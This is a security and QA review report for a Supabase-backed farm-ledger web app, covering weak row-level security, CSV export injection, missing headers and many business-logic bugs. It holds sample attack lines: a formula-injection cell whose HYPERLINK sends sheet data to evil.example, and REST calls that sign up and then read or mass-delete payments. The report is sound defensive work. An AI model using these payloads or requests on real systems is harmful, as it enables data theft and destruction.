# 02 Static security / QA review

Repo: `fms-audit-app/web`, branch `test/qa-report`. Date: 2026-10-03. Method: static reading of all of `src/`, the migration and the docs, plus local-only checks (`npm audit`, `npm run build`, `npm run lint`, `tsc`, grep, git history, node snippets, and a **throw-away local Postgres 17 on 127.0.0.1** loaded with the real migration to reproduce DB-rule gaps). The live Supabase project was never contacted. `.env` values were never read or printed (only the variable *names* were listed).

Legend: **Verified** = reproduced by running code/SQL here. **Read** = proven by reading the code (no run). **Suspected** = needs runtime/dashboard confirmation.

---

## 1. Summary

| ID | Sev | Title | Status |
|---|---|---|---|
| SEC-01 | High (Critical if sign-ups are on) | RLS is "any signed-in user can do anything"; safety rests on one unverified dashboard toggle | Read / dashboard unverified |
| BIZ-01 | High | Voiding/editing an ISSUE (or restoring a RETURN) breaks return-vs-issue rules; nothing detects it | Verified |
| BIZ-02 | High | Usage cost is "average of all purchases to date", not a moving average: batch costs under-allocate (৳50,000 of ৳5,00,000 vanished in test) | Verified |
| SEC-02 | Medium | Soft delete, audit and rules are UI-only; API can hard-DELETE / rewrite anything, no audit trail | Read |
| SEC-03 | Medium | CSV / formula injection in every export | Verified |
| SEC-04 | Medium | No CSP / frame-ancestors / Referrer-Policy etc. (`vercel.json` has only a rewrite) | Read |
| SEC-05 | Medium | Password reset / session hardening gaps (implicit flow, any session can reset, 6-char min, no MFA) | Read |
| BIZ-03 | Medium | `unit_cost` silently re-prices on any full-row edit of a usage (and never on purchase edits) | Verified |
| BIZ-04 | Medium | Voiding a bill is 2+ separate client calls; DB leaves live payments on void bills; no check finds them | Verified |
| BIZ-05 | Medium | "Edit bill below paid amount" is blocked only in the browser; DB has no trigger | Verified |
| BIZ-06 | Medium | Payment guard races (two concurrent payments both accepted) and no idempotency (duplicate submit = duplicate row) | Verified |
| BIZ-07 | Medium | Client sale-amount preview is 1 paisa lower than DB in ~1.7 % of sales; "Paid in full" leaves ৳0.01 due forever | Verified (simulation) |
| BIZ-08 | Medium | Core business rules exist only in the UI (dead > live, sale > live, entry after close, future dates, payment before bill) | Verified |
| BIZ-09 | Medium | Editing an item (category, kg/unit) re-writes history of every batch | Read |
| FE-01 | Medium | Stale caches: `batch-summary`, `today-counts`, `money-strip`, `payments` are never invalidated | Read |
| FE-02 | Medium | Invalidation key mismatch: `chick_purchases` vs `chick-purchases`; payment save does not refresh bill detail/list | Read |
| FE-03 | Medium | Updates matching 0 rows are reported as "Saved"; edit of non-existent id opens a blank edit form | Read |
| FE-04 | Medium | Number parsing: Bangla digits and junk become 0 silently; `1,5` becomes 15; decimals sent to integer columns | Verified |
| FE-05 | Medium | Hidden master `code` field: a failure leaves a Save button that does nothing, or an unfixable "code already used" | Read |
| FE-06 | Medium | 1000-row PostgREST cap makes list summaries / party payments silently wrong | Read |
| UX-01 | Medium | Entry lists (purchases, payments, sales, mortality, weights, chick purchases) are not reachable from the UI (F-41 is "Must") | Read |
| BIZ-10 | Low | DB uses UTC `current_date`; Bangladesh is UTC+6 (age, reminders wrong 00:00-06:00) | Verified |
| BIZ-11 | Low | KPI math caveats: FCR on billed net kg, `fcr_estimated` treats no-weight as 0 g, cost/kg on partly sold open batches | Read |
| BIZ-12 | Low | Numeric overflow / extra decimals: raw DB errors, silent rounding (qty 1.0005 becomes 1.001) | Verified |
| BIZ-13 | Low | Closing a batch: no due/stock check; edit form bypasses the "birds unaccounted for" confirmation | Read |
| BIZ-14 | Low | Delete reason lives inside `note` text (spoofable, stripped, inconsistent between the two delete paths) | Read |
| BIZ-15 | Low | Masters/batches can be hard-deleted and codes re-issued (docs say never reuse codes, no hard deletes) | Read |
| SEC-06 | Low | `.env` next to the app holds service_role key + DB password (not leaked: gitignored, not in history, not in bundle) | Verified |
| SEC-07 | Low | `supabase/.temp/` is untracked but NOT gitignored | Verified |
| SEC-08 | Low | Logout does not clear the query cache or `last:*` localStorage; `signOut()` not awaited | Read |
| SEC-09 | Low | DB hygiene: functions without `search_path`, trigger fns executable by PUBLIC, always-true RLS lint | Verified |
| FE-07 | Low | Raw PostgREST errors for bad ids; unknown route shows "arrives in milestone a later"; decimal ids pass the guard | Read |
| FE-08 | Low | Error handling gaps: unhandled export rejection, Safari "Load failed" not mapped, raw constraint names | Read |
| FE-09 | Low | a11y: tap targets 32-36 px (promise 44), billing fields have no label association, unlabeled selects | Read |
| FE-10 | Low | Edit form shows and accepts edits on already-deleted rows; two different delete implementations | Read |
| FE-11 | Low | Cache key collision `["entries","sales",id]` between detail (joined) and edit form (`select *`) | Read |
| FE-12 | Low | Possible: Enter key on billing forms triggers "Save & add another" (default submit button) | Suspected |
| UX-02 | Low | Hard UI blocks "Only 0 birds are live" until a chick purchase exists, with no pointer to fix it | Read |
| UX-03 | Low | Docs/wireframe mismatches: More page, data-check badge, pull-to-refresh, desktop sidebar, combobox pickers | Read |
| UX-04 | Low | Cosmetic: bill description `× 100.000 bag`; day count negative for future batches | Verified |
| SEC-10 | Info | pg_graphql / schema introspection and Auth settings not verifiable here | Suspected |
| SEC-11 | Info | `tel:` link and all React output are safe (no XSS sinks found) | Verified |
| FE-13 | Info | 30 lint warnings, 8 `as any/never` casts, untyped table access in entries/masters | Verified |

Counts: **Critical 0** (SEC-01 becomes Critical if public sign-up is enabled), **High 3**, **Medium 18**, **Low 19**, **Info 3** (43 total).

Top 5 to fix first: SEC-01, BIZ-01, BIZ-02, FE-01/FE-02 (stale numbers right after saving), BIZ-04/BIZ-05/BIZ-06 (payment/bill integrity), then FE-04 (digit parsing).

---

## 2. Security

### SEC-01 (High; Critical if sign-up is enabled): RLS is "every authenticated user owns everything"
- Evidence: `supabase/migrations/20261002000000_init.sql:584` creates, for all 12 tables, `for all to authenticated using (true) with check (true)`. Local check: `select * from pg_policies` shows `cmd=ALL roles={authenticated} qual=true with_check=true` on every table. Docs admit it (`docs/schema.md:224-236`, `README.md:25`).
- What it means: the *only* access control is "can this person obtain an `authenticated` JWT". That is decided by Supabase Auth settings that this repo cannot enforce: (a) "Allow new users to sign up" (README step 3 is a manual checkbox), (b) anonymous sign-ins (an anonymous session is also role `authenticated`), (c) magic-link / OTP / social providers, (d) a leaked or guessed password for the one account (no MFA, see SEC-05). Anyone who can sign up can read all finances, rewrite or delete everything via `https://<ref>.supabase.co/rest/v1/...` using the publishable key that is shipped in the bundle (verified: `sb_publishable_...` and the project URL are in `dist/assets/*.js`, which is by design).
- Exploit (if sign-up is on): `POST /auth/v1/signup {email,password}` then `GET /rest/v1/v_bills` with the returned JWT; `DELETE /rest/v1/payments?id=gt.0`.
- Fix: do not rely on the toggle. Make the policy name the owner: `using ((select auth.jwt()->>'email') = 'owner@example.com')` or a one-row `app_users` allow-list / `app_metadata.role = 'owner'` claim, on all tables (and `with check` too). Then still disable sign-ups and anonymous sign-ins. Verify both in the dashboard (listed in section 7).

### SEC-02 (Medium): soft delete, audit and all rules are UI conventions, not DB rules
- Evidence: policies grant DELETE on every table; no `created_by/updated_at/updated_by`, no audit table, no trigger on `is_void`. PRD S6 / `docs/prd.md` "no hard deletes" is not enforced.
- Exploit: any authenticated client can `DELETE /rest/v1/payments?id=eq.5` (no trace), or `PATCH` amounts of a closed batch.
- Impact: with one trusted user this is a bug-or-mistake risk, not an attacker risk, but there is no way to answer "who changed this bill" and the soft-delete promise is not real.
- Fix: `revoke delete on <ledger tables> from authenticated`; add `updated_at` + a generic audit trigger (`audit_log(table, row_id, old, new, at, uid)`); move delete/void/restore into RPCs (see BIZ-04).

### SEC-03 (Medium): CSV / formula injection (Verified)
- Evidence: `src/features/safety/csv.ts:5-9` `cell()` only quotes `, " \r \n`. Notes, names, companies, phones, item names, deleted reasons are free text and are exported by `ExportPage.tsx:35` and `exportBatch.ts:14`.
- Repro (ran `toCsv()` from the real file):
  ```
  rows = [{name:'=HYPERLINK("http://evil.example/?x="&A1,"click")', note:"+1+1", company:"@SUM(1+1)", phone:"-2+3"}]
  -> 1,"=HYPERLINK(""http://evil.example/?x=""&A1,""click"")",+1+1,@SUM(1+1),-2+3,...
  ```
  Excel/Sheets evaluate these on open. A supplier/buyer name or a pasted note can exfiltrate the sheet to a URL or run DDE on older Excel.
- Fix: in `cell()` for string values that start with `= + - @ \t \r`, prefix `'` (leave real numbers typed as `number` alone; note `-5` as a string phone must get the prefix, numbers stay numbers).

### SEC-04 (Medium): missing security headers
- Evidence: `vercel.json` contains only `rewrites`. No CSP, `frame-ancestors`/`X-Frame-Options`, `Referrer-Policy`, `X-Content-Type-Options`, `Permissions-Policy`. `index.html` has no CSP meta. (Vercel adds HSTS on its own domains by default; confirm with `curl -I` on the deployed URL, not done here.)
- Impact: the Supabase session token sits in `localStorage` (supabase-js default); with no CSP any future XSS can steal it. No frame protection: the app has destructive one-tap actions and can be framed (clickjacking).
- Fix (works with this build: only `self` scripts, one inline-SVG favicon, inline styles from Radix/Sonner):
  ```json
  "headers":[{"source":"/(.*)","headers":[
   {"key":"Content-Security-Policy","value":"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' https://<ref>.supabase.co; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"},
   {"key":"X-Content-Type-Options","value":"nosniff"},
   {"key":"Referrer-Policy","value":"no-referrer"},
   {"key":"Permissions-Policy","value":"camera=(), microphone=(), geolocation=()"}]}]
  ```
  (test the CSP in a preview; the `data:` favicon is why `img-src data:` is needed.)

### SEC-05 (Medium): password reset and session hardening
- `src/pages/ResetPasswordPage.tsx:33` shows the "new password" form for **any** session (`session ?` branch), not only a recovery session (no `PASSWORD_RECOVERY` check). Anyone at an unlocked, logged-in phone can set a new password without knowing the old one (`updateUser({password})`, line 22). After success it does not sign out other sessions.
- `minLength={6}` (line 42) only; no strength rule, no confirmation field. The whole farm ledger sits behind one password with no MFA and no lockout other than Supabase's rate limits.
- `src/lib/supabase.ts:11` uses defaults: implicit flow, so the recovery link puts `access_token` in the URL fragment (browser history, extensions). Prefer `createClient(url,key,{auth:{flowType:'pkce'}})`.
- `LoginPage.tsx:30-32`: `redirectTo` is built from `window.location.origin`, so no open-redirect from user input (good). Make sure the Supabase redirect allow-list has no wildcard / localhost entry (dashboard, unverified).
- User enumeration: login returns the same message for wrong email/password (`errors.ts:40`); `resetPasswordForEmail` always answers OK. Good. The reset endpoint can be hammered to exhaust the email quota (built-in SMTP is a few mails per hour) and lock the owner out of resets: add Turnstile/CAPTCHA or custom SMTP (suspected, dashboard).
- Fix: gate the form on the recovery event, `signOut({scope:'others'})` after success, min length 10-12 + confirm field, enable MFA (TOTP) in Auth, set a short JWT/refresh policy you are comfortable with.

### SEC-06 (Low): secrets sitting in the project folder (no leak found)
- `.env` exists (802 bytes), is gitignored (`.gitignore:2 .env`, `*.local`), was never committed (`git log --all --name-only` shows only `.env.example`), and the built bundle contains **no** secret: grep of `dist/` for `service_role`, `sb_secret_` (the only hit is supabase-js's own `startsWith("sb_secret_")` guard), `postgres://`, `SUPABASE_DB`, JWTs (`eyJ...`) found nothing; only `sb_publishable_...` + project URL are baked in (expected). History greps for key patterns only found placeholders (`postgresql://user:<pw>@host`).
- But the *names* in `.env` are: `SUPABASE_DB_PASS`, `SUPABASE_DB_CONNECTION_STRING`, `SUPABASE_SERVICE_ROLE_KEY`, `SUPABASE_ANON_KEY`, `SUPABASE_PROJECT_ID`, plus the two `VITE_` ones. The service-role key bypasses RLS entirely and lives in plaintext in the web project directory, next to the only two variables that are allowed to reach the browser. One mistaken rename to `VITE_...` ships it to everyone; any tool/agent that reads the folder sees it.
- Fix: keep service key / DB password out of this folder (password manager, or a separate `~/.config` file used only by the CLI), keep only the two `VITE_` vars in `.env.local`. If the service key has ever been pasted into a chat/tool, rotate it.

### SEC-07 (Low): `supabase/.temp/` not ignored
- `git status` shows `?? supabase/.temp/` (untracked, not ignored). It holds `project-ref`, `linked-project.json` (org id) and `pooler-url` (host + db user, no password seen). A `git add -A` would publish them to a public GitHub remote (`origin` is on github.com). Add `supabase/.temp/` (and `.playwright-mcp/`, `graphify-out` is already added) to `.gitignore`.

### SEC-08 (Low): logout / cache
- `MorePage.tsx:58` `onClick={() => supabase.auth.signOut()}` not awaited, no error handling, query cache not cleared (`App.tsx:12` module-level `QueryClient`), `last:*`, `lastBatchId`, `lastMethod`, `lastDeductionG`, `lastExportAt` stay in localStorage. On a shared phone the next login within `staleTime` (30 s) sees the previous session's cached ledgers. Fix: `await signOut(); queryClient.clear();`.

### SEC-09 (Low): DB hygiene (Verified locally)
- `select proname,prosecdef,proconfig,proacl from pg_proc`: the three `create_*` RPCs are `SECURITY INVOKER` (good: RLS applies), `execute` granted to `authenticated` only (good); no function sets `search_path` (Supabase advisor `function_search_path_mutable`), and `fn_usage_unit_cost` / `fn_payment_guard` have default PUBLIC execute (not callable as RPC since they return `trigger`, but advisor noise). No `SECURITY DEFINER` anywhere (good). All 8 views are `security_invoker = true` (good: `anon` gets zero rows because no policy covers it). `using (true)` triggers the advisor "RLS policy always true" lint.
- Fix: `set search_path = ''` (or `public`) on the functions, `revoke execute ... from public` on trigger fns.

### SEC-10 (Info): not verifiable statically
pg_graphql introspection exposed to `anon` (schema names visible even though rows are not), Auth provider list, leaked-password protection, email confirmation, JWT expiry, SMTP limits. See section 7.

### SEC-11 (Info): XSS / injection surface looks clean
- `grep` found no `dangerouslySetInnerHTML`, `innerHTML`, `eval`, `window.open`, `document.write`. The only data-built URL is `PartyDetailPage.tsx:47` `href={\`tel:${b.phone}\`}`: scheme is fixed, React escapes it, so no `javascript:` injection; phone format is validated only client-side (`MasterPage.tsx:263`).
- No PostgREST filter injection: user input only reaches `.eq()/.in()/.gte()` values (URL-encoded by supabase-js); there is no `.or()`/`.ilike()`. Table names/select strings are constants (`entryTypes.ts`, `fetchAll.ts`).
- `npm audit` and `npm audit --omit=dev`: 0 vulnerabilities.

---

## 3. Data integrity and business logic

All "Verified" items below were run against a local Postgres 17 with `supabase/migrations/20261002000000_init.sql` applied (seed: 1 item at ৳2000/bag, 100 bags purchased 2026-09-01, batch B-1 with 1000 chicks).

### BIZ-01 (High): return/issue consistency is broken by void, restore, qty and date edits
- Evidence: `init.sql:253-254` the trigger fires only on `insert or update of item_id, batch_id, date, kind, qty`. It does **not** fire on `is_void`, and for an ISSUE it never looks at later RETURNs. For a RETURN it ignores dates.
- Repro (all succeeded, no error):
  ```sql
  insert into usages(date,batch_id,item_id,kind,qty) values('2026-09-05',1,1,'ISSUE',10);
  insert into usages(date,batch_id,item_id,kind,qty) values('2026-09-06',1,1,'RETURN',8);
  update usages set is_void=true where kind='ISSUE';        -- A
  ```
  A: `v_batch_summary.feed_bags = -8.000`, `feed_cost = -16000`, `v_item_stock.balance_qty = 108` while only 100 were ever purchased; `v_data_checks` returns **0 rows** (no check covers it).
  B: void a RETURN (8), add another RETURN (8) (allowed, net issued is 10), then `update usages set is_void=false` on the first: succeeds, `feed_bags = -6`.
  C: `update usages set qty=3 where kind='ISSUE'` with an 8-bag return outstanding: succeeds, `feed_bags = -5`.
  C2: move the ISSUE date to 2026-09-30 (after the RETURN dated 09-06): succeeds. D: a RETURN dated before the ISSUE is accepted.
- Doc conflict: `features.md` F-40 and `page-layouts/15-entry-detail.md` say restoring "triggers re-validate (e.g. a return can't exceed issued)". It does not: restore is `is_void=false`, which the trigger ignores. `EntryDetailPage.tsx:84` and `daily/shared.tsx:150` rely on that promise.
- Impact: feed kg, FCR, cost per kg and stock become wrong with no warning.
- Fix: widen the trigger to `before insert or update` (all columns incl. `is_void`), and add the reverse check: when an ISSUE is voided/lowered/moved, require `sum(issues) >= sum(returns)` for that batch+item (also order by date if you want date discipline). Add a `v_data_checks` row "Returned more than issued" and "Payment on voided bill" as a safety net.

### BIZ-02 (High): issue cost is not a moving average; costs under-allocate
- Evidence: `init.sql:221-223` `sum(p.amount) / sum(p.qty)` over **all** non-void purchases with `p.date <= new.date`, ignoring how much of earlier lots was already consumed. `docs/schema.md:174` calls it "weighted-average purchase price".
- Repro: buy 100 @ 2000 on 09-01 and 100 @ 3000 on 09-10; issue 100 on 09-05 (cost 2000) and 100 on 09-12 (cost 2500 = avg of both lots).
  `sum(usages.cost) = 450,000.00` vs `sum(purchases.amount) = 500,000.00`, `v_item_stock.balance_qty = 0`, `stock_value = 0`. ৳50,000 of real spend is attributed to no batch, so batch cost, cost/kg, margin and FCR-cost are understated; the more the price moves, the bigger the gap. Success criterion S2 ("batch numbers match a manual calculation") fails in a plain two-lot scenario.
- Fix options: (a) true moving average (recompute `avg_cost` after each purchase/issue in date order), (b) FIFO lots, (c) at minimum add a data check `sum(usages cost) + stock_value <> sum(purchases)` per item and show "unallocated ৳X" on Stock.

### BIZ-03 (Medium): `unit_cost` is a frozen snapshot that is re-priced by accident
- Evidence: `UsageFormPage.tsx:133-143` sends the full row (item, batch, date, kind, qty, note) on every edit, which fires the trigger even for a note-only change (`init.sql:254`).
- Repro: issue 10 bags (cost 2000), later add a back-dated purchase @ 4000 on 09-01, then `update usages set item_id=item_id, batch_id=batch_id, date=date, kind=kind, qty=qty, note='x'` -> `unit_cost 2000 -> 3000`, `cost 20000 -> 30000`.
- Conversely editing/voiding/moving a *purchase* never re-prices usages (`PurchaseFormPage.tsx:229` says so, which is honest), and moving/voiding the purchase after usage exists leaves usage with no purchase before it (repro E: stock `-10`, only the data check "Item used more than purchased" flags it).
- Impact: costs depend on *when* someone last touched a row. Fix: decide a policy: either recompute all usages of an item deterministically (view/materialised), or update only changed columns in the UI and make the trigger skip when `qty/item/date/kind` are unchanged (`IS NOT DISTINCT FROM old`).

### BIZ-04 (Medium): bill void is non-atomic and DB leaves orphan payments
- Evidence: `EntryDetailPage.tsx:89-100`: PATCH bill `is_void=true`, then a PATCH per payment; failure of any later call attempts a client-side rollback that can fail as well. Undo (`:110-117`) and restore (`:83-87`) are also multi-step. Nothing in the DB links bill void to payments (`docs/schema.md:261` admits it).
- Repro (F): `create_sale(... received 5000)`, then `update sales set is_void=true` -> `payments` row still `is_void=false`, `v_buyer_balance` shows 0 bills/0 received, **no data check** reports it. The Payments list summary (`entryTypes.ts:317`) and the CSV export still count it as live money.
- Fix: `void_bill(type,id,reason)` / `restore_bill(...)` RPCs doing everything in one transaction; add a trigger that rejects voiding a bill with live payments (or cascades), and a data check "Live payment on voided bill".

### BIZ-05 (Medium): editing a bill below what is already paid is a browser-only rule
- Evidence: `billing/shared.tsx:336-339` `belowPaid()` uses `bill.data?.paid`. If `useBill` has not loaded (slow network) or is stale (second tab/device), `paid` is `undefined`/old and the guard passes; the DB has no trigger on `purchases/sales/chick_purchases` updates.
- Repro (G): purchase ৳10,000 paid ৳10,000, then `update purchases set unit_price=500` -> amount 5,000, v_bills `paid=10000 due=-5000 status=PAID`; only `v_data_checks` "Bill paid more than its amount" fires.
- Fix: `after update` trigger on the three bill tables: reject if `new.amount < sum(non-void payments)`. Also block while `bill` query is pending in the UI (`disabled` until loaded).

### BIZ-06 (Medium): payment guard race and no idempotency
- Evidence: `fn_payment_guard` (`init.sql:258-296`) reads `sum(amount)` without locking the bill row.
- Repro: two sessions, bill ৳10,000; session 1 `begin; insert payment 8000; select pg_sleep(2); commit;`, session 2 inserts 8000 meanwhile -> **second payment accepted**; result `paid 16000, due -6000, status PAID`. Two tabs, or the phone plus a laptop, or a double-tap on a slow connection can overpay.
- Duplicate submits: running the identical `create_purchase(...)` twice creates two bills (no idempotency key). The UI disables the button while pending (good) but a lost response + retry duplicates.
- Fix: `select ... from <bill> where id = ... for update` at the top of the guard; optional client-generated `request_id uuid unique` passed to the RPCs.

### BIZ-07 (Medium): sale amount preview differs from the DB by ৳0.01 in ~1.7 % of sales
- Evidence: preview `SaleFormPage.tsx:133-138` uses floats: `net = gross - crates*ded/1000; amount = r2(net*rate - discount)` with `r2` from `billing/shared.tsx:34` (`Math.round((v+EPSILON)*100)/100`). `EPSILON` (2.2e-16) is useless at ৳5,00,000 magnitude. The DB (`init.sql:122-127`) uses exact numeric and `round(...,2)`.
- Test (exact-numeric emulation with BigInt, 2,000,000 random sales; gross 3 dp, integer g/crate, integer rate, optional discount): 33,627 mismatches (1.7 %), **client lower in all of them, never higher**. Example: gross 2705.969, ded 36 g, rate 195, discount 451.53 -> client 526257.70, DB 526257.71. With 2-dp deductions/rates: 765 mismatches (0.04 %), e.g. gross 4995.12, ded 75.48, rate 231.98, disc 486.52 -> 1153903.95 vs 1153903.96. Crate count never differed (0 float mismatches over 0.001-200 kg). Purchases (`qty*price`) showed 0 mismatches in 1,000,000 trials.
- Impact: "Paid in full" (`billing/shared.tsx:300`) and typing the previewed amount in "Received now" store ৳0.01 less than the bill, leaving a permanent ৳0.01 due / PARTIALLY badge / row in "Unpaid bills" (`Money` shows ৳0 due but status PARTIALLY). Also `net_weight_kg` is stored `numeric(10,3)` (`init.sql:122`) while `amount` uses the unrounded net, so displayed `net kg x rate` does not reproduce the amount when deduction has decimals (94 % of 2-dp cases; max ৳~0.05 at ৳150/kg).
- Fix: compute in integer micro-units (`Math.round` on integers, or use `decimal.js`), or call a tiny RPC `preview_sale()` / read the DB-generated amount after insert and let "Paid in full" pay `bill.due`.

### BIZ-08 (Medium): rules that live only in the browser
- Verified on the DB: after `close_date='2026-09-10'`, `insert mortalities (date '2026-12-31', dead 5000)` into a batch of 1010 chicks, and `create_sale('2027-01-01', 100 birds)` all succeed; `v_batch_summary.mortality_pct = 4.9505` (495 %), `live_balance = -4090`. Only the data checks notice ("Closed batch: live balance not 0", "Dead + sold exceeds chicks placed", "Entry dated outside batch").
- UI-only: mortality > live (`MortalityFormPage.tsx:99,133`), sale birds > live (`SaleFormPage.tsx:204`), usage return > issued pre-check, 20-5000 g average-weight sanity (`WeightFormPage.tsx:66,97`), payment <= due.
- Also unconstrained: dates in the future or year 0026 (`<input type=date>` allows it), payment dated before its bill, entries into closed batches, weights after close.
- Impact: anything entered via another client, the dashboard, or a stale tab skips the rules; the 495 % case would be shown as truth on Home.
- Fix: `check` / trigger for `date between batch.start_date and coalesce(close_date, current_date)` (or at least `<= current_date + 1`), `payments.date >= bill.date`, and a trigger that rejects mortality/sales that drive `live_balance < 0` unless a flag is set.

### BIZ-09 (Medium): master edits rewrite history
- Evidence: `masterTypes.ts:99-131` lets category, unit, `unit_weight_kg` be edited on used items; views join `items` live (`init.sql:421-428`, `v_batch_summary.used`). Changing an item from FEED to MEDICINE (or kg/bag 50 -> 25) instantly changes `feed_kg`, `fcr`, `fcr_estimated` and the feed/medicine cost split of every past batch. Archiving a supplier hides it from pickers but not from totals (fine).
- Fix: block `category`/`unit_weight_kg` change once an item has usages/purchases (trigger), or snapshot `unit_weight_kg` into `usages` at insert like `unit_cost`.

### BIZ-10 (Low): UTC vs Bangladesh time (Verified with `node`)
- `init.sql:435` (`age_days`), `:536-543` (`v_reminders`) use `current_date`, i.e. the DB's UTC date; the client uses local time (`format.ts:81-86` `today()`, correct if the phone's TZ is Asia/Dhaka). Test: instant `2026-10-03T20:00Z` -> device in Asia/Dhaka `today() = 2026-10-04`, Postgres `current_date = 2026-10-03`. Between 00:00 and 06:00 local the batch age and the "no usage since yesterday" reminder are one day behind and the "Day N" shown on Home disagrees with the date the entry form defaults to. A phone with a wrong time zone (e.g. travelling, or a UTC-set tablet) will default every form date to the wrong day with no warning.
- Fix: `(now() at time zone 'Asia/Dhaka')::date` in the views; optionally warn if the form date differs from DB date by > 1.

### BIZ-11 (Low): KPI definitions worth a second look
- `fcr = feed_kg / net_kg_sold` (`init.sql:470`) uses **billed net kg after crate deduction**, not live kg sold, so FCR is overstated by the deduction share (1.75 % in the Sale example). Label or compute on gross.
- `fcr_estimated` (`:471-472`) does `coalesce(latest_avg_weight_g, 0)`: with no weight sample, live birds count as 0 kg -> FCR looks bad; with an old sample it is stale; negative `live_balance` produces nonsense. Show "—" unless a weight exists within N days.
- `cost_per_kg` and `margin_per_chick` are computed on open batches too (all cost / only the kg sold so far); the UI hides them for open batches (`BatchDetailPage.tsx:149-152`) but `v_batch_summary` consumers and the CSV export expose them.
- `mortality_pct` rounds to 4 dp (0.01 %): fine. Divide-by-zero is guarded everywhere with `nullif` (good). Void rows are excluded consistently in views (good).

### BIZ-12 (Low): numeric limits and silent rounding (Verified)
- `create_purchase(qty 1e12)` -> `numeric field overflow` (raw message shown as "Couldn't save: numeric field overflow"); `qty 0.0004` -> `new row ... violates check constraint "purchases_qty_check"` (raw; `errors.ts:13-21` maps only 7 constraint names); `qty 1.0005, price 1.005` -> stored `1.001`, `1.01`, amount `1.01`, while the client preview used the unrounded inputs. No client max on counts/amounts (`male: 99999999999` -> int overflow).
- Fix: clamp/round to the column scale in `n()` (3 dp qty, 2 dp money) and show the rounded value; map `22003` and the remaining `*_check` names.

### BIZ-13 (Low): closing a batch
- `BatchDetailPage.tsx:223-263` requires acknowledgment only for a bird gap. It does not mention unpaid sale dues, unreturned/negative stock, entries dated after the chosen close date, or a future close date. `BatchFormPage.tsx:134-146` lets the Edit form set/clear `close_date` directly with only `>= start_date`, bypassing the F-22 gap confirmation. Reopen has no confirmation.

### BIZ-14 (Low): delete reason stored inside `note`
- `entryTypes.ts:333-338` and `daily/shared.tsx:150`. Reason text is parsed back with a regex, so a note typed as `[deleted: x]` is indistinguishable; `stripDeleted` removes any such text on restore; `DeleteEntry` (`shared.tsx:150`) does not escape `]` while `withDeleted` does; the edit form's note box shows the raw marker and a later save stores it again. `docs/design.md §4.3` accepts this, but `deleted_reason`, `deleted_at` columns would be safer and queryable.

### BIZ-15 (Low): hard deletes and code reuse
- `MasterPage.tsx:215` and `BatchFormPage.tsx:88` hard-delete; `queries.ts:40-51 nextCode()` is max+1, so deleting the highest unused code re-issues it. `docs/schema.md:278` and PRD S6 say codes are never reused and nothing is hard-deleted. Also `nextCode` is read-then-insert: two tabs get the same code (see FE-05).

---

## 4. Frontend correctness

### FE-01 (Medium): caches that nothing invalidates
Full inventory of `queryKey`s (grep) vs. every `invalidateQueries`:

| Key (file) | Invalidated by | Problem |
|---|---|---|
| `["batch-summary", name, id]` x5 (`batch-summary/queries.ts:5`) | **nobody** | Batch detail sections (weights, mortality, usages, sales, chicks) stay stale up to `staleTime` 30 s after you save and `navigate(-1)` back. Home/Batch KPIs refresh (they use `v_batch_summary`) but the lists below them do not -> numbers contradict each other. |
| `["today-counts", date]` (`home/queries.ts:42`) | nobody | Home "Today: 0 entries" right after saving an entry. |
| `["money-strip"]` (`home/queries.ts:27`) | nobody | Home "We owe / Owed to us" stale after payments/bills. |
| `["payments", party]` (`money/queries.ts:65`) | nobody | Party detail "Payments" tab stale after a payment. |
| `["masterOptions", t]` (`EntryListPage.tsx:244`) | nobody | Renamed/added masters missing in filters. |
| `["master", t]` (MasterPage) | only MasterPage | Master edits do not refresh `v_item_stock`, `v_batch_summary` (kg/bag changes), `["entries"]` (joined names), `["balances"]`. |
| `["batches", id]` | create/edit only (`BatchFormPage.tsx:80`) | delete path invalidates only summaries. |
| `invalidateLedgers` (`entryTypes.ts:344`) | | omits `batch-summary`, `money-strip`, `today-counts`, `payments`. |
| `useInvalidateDaily` (`daily/shared.tsx:44`) | | omits `batch-summary`, `today-counts`, `money-strip`. |
- Fix: one `invalidateAll(qc)` helper (or simply `qc.invalidateQueries()` after any successful mutation; the app is tiny) and shared key factories.

### FE-02 (Medium): invalidation key mismatches that affect entry pages
- `ChickPurchaseFormPage.tsx:146` calls `invalidateBilling(qc, "chick_purchases")` -> invalidates `["entries","chick_purchases"]`, but the list/detail use `cfg.type = "chick-purchases"` (`entryTypes.ts:253`): after saving/editing a chick purchase the **list and detail keep showing old data** (up to 30 s). The form's own key `["entries","chick_purchases",id]` (`:77`) matches only itself.
- `invalidateBilling(qc,"payments")` (`PaymentFormPage.tsx:181`) only touches `["entries","payments"]` + `["v_bills"]` etc. The bill's detail payments `["entries","sales"|"purchases"|"chick-purchases", id, "payments"]` and status map `["entries", type, "bills"]` are not invalidated: after "Record payment" -> Save -> back, the bill detail still shows the old due/status and the list shows the old badge (`EntryDetailPage.tsx:60-65`, `EntryListPage.tsx:66`).
- Fix: key helpers + invalidate the `["entries"]` root after every mutation.

### FE-03 (Medium): updates that affect 0 rows are reported as success
- Evidence: bill edits `SaleFormPage.tsx:163`, `PurchaseFormPage.tsx:148`, `ChickPurchaseFormPage.tsx:128`, `PaymentFormPage.tsx:168`, batch `BatchFormPage.tsx:73`, masters `MasterPage.tsx:202,232`, `DeleteEntry` and mortality edit `MortalityFormPage.tsx:113` (`select("id")` with no `.single()`, empty array accepted) all `update(...).eq("id", id)` without checking that a row came back. PostgREST returns 200/204 with 0 rows when the row does not exist **or RLS filters it out**, so the user gets "Saved" and is navigated away although nothing was written. Combined with `/mortalities/99999/edit` (`useEntryRow` errors, but the form still renders blank in edit mode) this is a realistic data-loss illusion.
- Fix: `.select().single()` on every update and let the error surface; or `Prefer: return=representation` + length check in `unwrap`.

### FE-04 (Medium): number parsing (Verified with node)
`toNum` (`daily/shared.tsx:185`) and `n` (`billing/shared.tsx:29`):

| Input | `toNum` | `n` | Consequence |
|---|---|---|---|
| `1,5` | 15 | 15 | doc-comment says `"1,5" -> number`; a decimal comma becomes x10 |
| `১২` / `৫০০` (Bangla digits) | NaN | **0** | optional money fields (`received`, `discount`, `deduction`) silently become 0: a ৳500 payment typed in Bangla is **not recorded** and the toast says "due ..." |
| `1 000`, `50 tk`, `abc` | NaN | **0** | same silent-zero for optional fields; required ones say "Must be more than 0" |
| `Infinity` | Infinity | 0 | usage qty passes `> 0`, JSON serialises to `null` -> DB not-null error (raw) |
| `1e3`, `0x10` | 1000, 16 | same | accepted |
| birds `5.5` | n/a | 5.5 | sent to an `integer` column: raw `invalid input syntax for type integer` (`SaleFormPage.tsx:153`; only `notNegative` is applied, `Math.trunc` is used only in chick purchase) |
